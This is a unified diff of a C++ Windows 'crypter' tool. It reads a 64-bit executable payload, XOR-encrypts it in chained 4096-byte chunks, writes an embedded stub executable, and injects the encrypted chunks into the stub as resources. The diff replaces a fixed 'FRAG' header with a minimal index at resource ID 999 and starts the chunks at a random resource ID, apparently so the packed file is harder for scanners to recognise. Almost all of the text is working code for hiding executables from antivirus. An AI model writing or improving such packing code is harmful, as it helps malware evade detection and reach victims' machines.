@@ -4,63 +4,64 @@
 #include <vector>
 #include "stub_bytes.h"
 #include <cstdint>
-#include <algorithm>  // for std::min
+#include <algorithm>
+#include <random>
+#include <ctime>       // ← for time()
 using namespace std;
-
 
 // ============================================================================
 // STRUCTURES
 // ============================================================================
 #pragma pack(push, 1)
-struct ChunkHeader {
-    char magic[4];           // "FRAG"
+struct PayloadIndex {
+    uint32_t magic = 0xCAFEBABE;
+    uint8_t  first_key;
     uint32_t total_size;
-    uint16_t total_chunks;
-    uint16_t chunk_size;
-    uint8_t encryption_key;  // ONLY the first key now
+    uint16_t chunk_count;
+    uint16_t first_chunk_id;
     uint32_t crc32;
-    char marker[8];          // "CHUNK001"
 };
 #pragma pack(pop)
 
 // ============================================================================
-// FORWARD DECLARATIONS
+// GLOBAL
 // ============================================================================
-bool ReadPayloadFile(const char* filename, char** buffer, long* size);
-bool ValidatePEArchitecture(char* fileBuffer);
-void DisplayChunkInfo(long fileSize, int chunkSize);
-bool WriteStubToFile();
-bool FragmentAndInjectPayloadChained(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, int chunkSize, uint8_t first_key);
-void CleanupResources(char* fileBuffer);
-uint32_t CalculateCRC32(const char* data, size_t length);
+char* fileBuffer = nullptr;
 
-// Global so header can use it
-char* fileBuffer = nullptr;  // original payload (plain)
+// ============================================================================
+// CRC32
+// ============================================================================
+uint32_t CalculateCRC32(const char* data, size_t length) {
+    uint32_t crc = 0xFFFFFFFF;
+    for (size_t i = 0; i < length; i++) {
+        crc ^= (uint32_t)(unsigned char)data[i];
+        for (int j = 0; j < 8; j++)
+            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
+    }
+    return ~crc;
+}
 
 // ============================================================================
 // CHAINED ENCRYPTION
 // ============================================================================
-std::vector<std::vector<char>> EncryptPayloadChained(const char* payload, long size, uint8_t first_key)
-{
+std::vector<std::vector<char>> EncryptPayloadChained(const char* payload, long size, uint8_t first_key) {
     const int CHUNK_SIZE = 4096;
     int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
     std::vector<std::vector<char>> encrypted_chunks(totalChunks);
-
     uint8_t current_key = first_key;
 
     for (int i = 0; i < totalChunks; i++) {
         int chunk_start = i * CHUNK_SIZE;
         int chunk_len = std::min(CHUNK_SIZE, (int)(size - chunk_start));
-
         std::vector<char> plain_chunk(payload + chunk_start, payload + chunk_start + chunk_len);
-        std::vector<char>& encrypted_chunk = encrypted_chunks[i];
+        auto& encrypted_chunk = encrypted_chunks[i];
         encrypted_chunk.resize(chunk_len);
 
         for (int j = 0; j < chunk_len; j++) {
             encrypted_chunk[j] = plain_chunk[j] ^ current_key;
         }
 
-        cout << "[+] Chunk " << i << " encrypted with key 0x" << hex << (unsigned int)current_key << dec << endl;
+        cout << "[+] Chunk " << i << " encrypted with key 0x" << hex << (int)current_key << dec << endl;
 
         if (i < totalChunks - 1) {
             uint32_t crc = CalculateCRC32(plain_chunk.data(), plain_chunk.size());
@@ -71,10 +72,9 @@ std::vector<std::vector<char>> EncryptPayloadChained(const char* payload, long s
 }
 
 // ============================================================================
-// INJECT CHAINED CHUNKS
+// INJECT WITH MINIMAL SEPARATE INDEX
 // ============================================================================
-bool FragmentAndInjectPayloadChained(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, int chunkSize, uint8_t first_key)
-{
+bool InjectWithSeparateIndex(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
     HANDLE hUpdate = BeginUpdateResourceA("Stub.exe", FALSE);
     if (!hUpdate) {
         cerr << "[-] BeginUpdateResource failed" << endl;
@@ -82,112 +82,57 @@ bool FragmentAndInjectPayloadChained(const std::vector<std::vector<char>>& encry
     }
 
     int totalChunks = (int)encrypted_chunks.size();
+    uint16_t first_chunk_id = 200 + (rand() % 500);  // random 200-699
 
-    ChunkHeader header{};
-    memcpy(header.magic, "FRAG", 4);
-    header.total_size = payloadSize;
-    header.total_chunks = totalChunks;
-    header.chunk_size = chunkSize;
-    header.encryption_key = first_key;
-    header.crc32 = CalculateCRC32(fileBuffer, payloadSize);
-    memcpy(header.marker, "CHUNK001", 8);
+    PayloadIndex index{};
+    index.first_key = first_key;
+    index.total_size = (uint32_t)payloadSize;
+    index.chunk_count = (uint16_t)totalChunks;
+    index.first_chunk_id = first_chunk_id;
+    index.crc32 = CalculateCRC32(fileBuffer, payloadSize);
 
-    // Chunk 0: header + encrypted data
-    const auto& chunk0 = encrypted_chunks[0];
-    std::vector<char> chunk0_blob(sizeof(header) + chunk0.size());
-    memcpy(chunk0_blob.data(), &header, sizeof(header));
-    memcpy(chunk0_blob.data() + sizeof(header), chunk0.data(), chunk0.size());
-
-    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(132),
+    // Inject index at ID 999
+    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(999),
         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
-        chunk0_blob.data(), (DWORD)chunk0_blob.size())) {
+        (LPVOID)&index, sizeof(index))) {
+        cerr << "[-] Failed to inject index" << endl;
         EndUpdateResource(hUpdate, TRUE);
         return false;
     }
 
-    // Other chunks
-        // All other chunks
-    for (int i = 1; i < totalChunks; i++) {
-        int resId = 132 + i;
-        const auto& data = encrypted_chunks[i];
-        if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(resId),
+    // Inject chunks sequentially
+    for (int i = 0; i < totalChunks; i++) {
+        int id = first_chunk_id + i;
+        const auto& chunk = encrypted_chunks[i];
+        if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(id),
             MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
-            (LPVOID)data.data(), (DWORD)data.size())) {  // ← fixed here
-            cerr << "[-] Failed to update resource ID " << resId << endl;
+            (LPVOID)chunk.data(), (DWORD)chunk.size())) {
+            cerr << "[-] Failed to inject chunk ID " << id << endl;
             EndUpdateResource(hUpdate, TRUE);
             return false;
         }
+        cout << "[+] Chunk " << i << " -> ID " << id << endl;
     }
+
     if (!EndUpdateResource(hUpdate, FALSE)) {
         cerr << "[-] EndUpdateResource failed" << endl;
         return false;
     }
 
-    std::cout << "[+] Successfully injected " << totalChunks << " chained-encrypted chunks!" << endl;
+    cout << "[+] Minimal index (ID 999) + sequential chunks from ID " << first_chunk_id << endl;
     return true;
 }
 
 // ============================================================================
-// MAIN
-// ============================================================================
-int main(int argc, char* argv[])
-{
-    if (argc < 2) {
-        cout << "Usage: crypter.exe <payload.exe>" << endl;
-        system("pause");
-        return 1;
-    }
-
-    const char* payloadFilename = argv[1];
-    long fileSize = 0;
-    const int CHUNK_SIZE = 4096;
-    const uint8_t FIRST_KEY = 0x5B;
-
-    cout << "[*] Reading payload..." << endl;
-    if (!ReadPayloadFile(payloadFilename, &fileBuffer, &fileSize)) return 1;
-
-    cout << "[+] Payload size: " << fileSize << " bytes" << endl;
-
-    if (!ValidatePEArchitecture(fileBuffer)) {
-        CleanupResources(fileBuffer);
-        return 1;
-    }
-
-    DisplayChunkInfo(fileSize, CHUNK_SIZE);
-
-    cout << "[*] Encrypting with chained XOR (key starts 0x5B)" << endl;
-    auto encrypted_chunks = EncryptPayloadChained(fileBuffer, fileSize, FIRST_KEY);
-
-    cout << "[*] Writing stub..." << endl;
-    if (!WriteStubToFile()) {
-        CleanupResources(fileBuffer);
-        return 1;
-    }
-
-    cout << "[*] Injecting fragments..." << endl;
-    if (!FragmentAndInjectPayloadChained(encrypted_chunks, fileSize, CHUNK_SIZE, FIRST_KEY)) {
-        CleanupResources(fileBuffer);
-        return 1;
-    }
-
-    cout << "\n[SUCCESS] All done! Stub.exe ready with chained encryption.\n" << endl;
-
-    CleanupResources(fileBuffer);
-    system("pause");
-    return 0;
-}
-
-// ============================================================================
-// REST OF YOUR OLD FUNCTIONS (unchanged)
+// OLD FUNCTIONS (keep only what you need)
 // ============================================================================
 bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
     FILE* file = fopen(filename, "rb");
-    if (!file) { cerr << "[-] Can't open file" << endl; return false; }
+    if (!file) return false;
     fseek(file, 0, SEEK_END);
     *size = ftell(file);
     rewind(file);
     *buffer = (char*)malloc(*size);
-    if (!*buffer) { fclose(file); return false; }
     fread(*buffer, 1, *size, file);
     fclose(file);
     return true;
@@ -200,11 +145,6 @@ bool ValidatePEArchitecture(char* fileBuffer) {
     return nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
 }
 
-void DisplayChunkInfo(long fileSize, int chunkSize) {
-    int total = (fileSize + chunkSize - 1) / chunkSize;
-    cout << "\n=== Will create " << total << " chunks ===\n" << endl;
-}
-
 bool WriteStubToFile() {
     ofstream file("Stub.exe", ios::binary);
     if (!file.write((char*)Stub_exe, Stub_exe_len)) return false;
@@ -212,16 +152,40 @@ bool WriteStubToFile() {
     return true;
 }
 
-uint32_t CalculateCRC32(const char* data, size_t length) {
-    uint32_t crc = 0xFFFFFFFF;
-    for (size_t i = 0; i < length; i++) {
-        crc ^= data[i];
-        for (int j = 0; j < 8; j++)
-            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
-    }
-    return ~crc;
-}
-
 void CleanupResources(char* fileBuffer) {
     if (fileBuffer) free(fileBuffer);
+}
+
+// ============================================================================
+// MAIN
+// ============================================================================
+int main(int argc, char* argv[]) {
+    srand((unsigned)time(nullptr));  // ← fixed for C++11+
+
+    if (argc < 2) {
+        cout << "Usage: crypter.exe <payload.exe>" << endl;
+        system("pause");
+        return 1;
+    }
+
+    const char* payloadFilename = argv[1];
+    long fileSize = 0;
+    const uint8_t FIRST_KEY = 0x5B;
+
+    if (!ReadPayloadFile(payloadFilename, &fileBuffer, &fileSize)) return 1;
+    if (!ValidatePEArchitecture(fileBuffer)) { CleanupResources(fileBuffer); return 1; }
+
+    auto encrypted_chunks = EncryptPayloadChained(fileBuffer, fileSize, FIRST_KEY);
+
+    if (!WriteStubToFile()) { CleanupResources(fileBuffer); return 1; }
+
+    if (!InjectWithSeparateIndex(encrypted_chunks, fileSize, FIRST_KEY)) {
+        CleanupResources(fileBuffer);
+        return 1;
+    }
+
+    cout << "\n[SUCCESS] Crypter finished – minimal separate index + sequential chunks!\n" << endl;
+    CleanupResources(fileBuffer);
+    system("pause");
+    return 0;
 }
